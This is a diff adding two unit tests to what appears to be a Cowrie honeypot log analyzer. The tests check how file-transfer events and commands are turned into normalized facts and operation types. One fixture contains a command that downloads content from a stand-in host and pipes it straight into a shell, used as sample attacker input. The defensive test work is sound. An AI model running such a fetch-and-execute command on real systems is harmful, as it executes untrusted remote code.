@@ -582,6 +582,80 @@ def test_old_and_new_transfer_authority_differences_are_explicit() -> None:
     assert outcomes == [(True, False), (False, True)]
 
 
+def test_direct_transfer_preserves_reviewed_uri_scheme_and_observed_cwd() -> None:
+    session_id = "direct-transfer-context"
+    payload = _payload(
+        session_id,
+        transfer_events=[
+            _transfer_event(
+                session_id,
+                eventid="cowrie.session.file_upload",
+                path="incoming/object.bin",
+                url="sftp://collector.invalid/incoming/object.bin",
+                cwd="/srv/intake",
+            )
+        ],
+    )
+    _observed, fact_set, selection = _typed_inputs(payload)
+    fact = fact_set["facts"][0]
+
+    assert selection["status"] == "matched"
+    assert [
+        item["normalized_value"]
+        for item in fact["entities"]["urls"]
+    ] == ["sftp://collector.invalid/incoming/object.bin"]
+    assert [
+        item["normalized_value"]
+        for item in fact["entities"]["destination_paths"]
+    ] == ["/srv/intake/incoming/object.bin"]
+    assert fact["path_resolutions"][0]["resolution_status"] == (
+        "recorded_resolved"
+    )
+    assert fact["path_resolutions"][0]["path_identity_id"]
+
+
+def test_fact_and_transfer_facets_follow_complete_evidence_order() -> None:
+    session_id = "complete-transfer-order"
+    direct = _transfer_event(
+        session_id,
+        index=0,
+        path="/srv/order/object.bin",
+    )
+    command = _command_event(
+        session_id,
+        "curl -s https://order.invalid/object.bin | dash",
+        index=1,
+        outcome="success",
+    )
+    payload = {
+        "session_id": session_id,
+        "src_ip": "192.0.2.171",
+        "commands": [command["input"]],
+        "commands_success": [command["input"]],
+        "commands_failed": [],
+        "classification_events": [],
+        "raw_events": [direct, command],
+    }
+    _observed, fact_set, selection = _typed_inputs(payload)
+
+    assert [fact["source_index"] for fact in fact_set["facts"]] == [0, 1, 1]
+    assert [
+        operation["operation_type"]
+        for fact in fact_set["facts"]
+        for operation in fact["operations"]
+    ] == [
+        "transfer_observed",
+        "remote_content_access",
+        "remote_content_pipe_source",
+        "transfer_attempt",
+        "shell_pipe_execution_attempt",
+    ]
+    assert fact_set["shadow_comparison"]["status"] == (
+        "exact_source_coverage"
+    )
+    assert selection["status"] == "matched"
+
+
 def test_historical_one_family_v4_v3_record_remains_readable() -> None:
     session_id = "historical-one-family"
     payload = _payload(
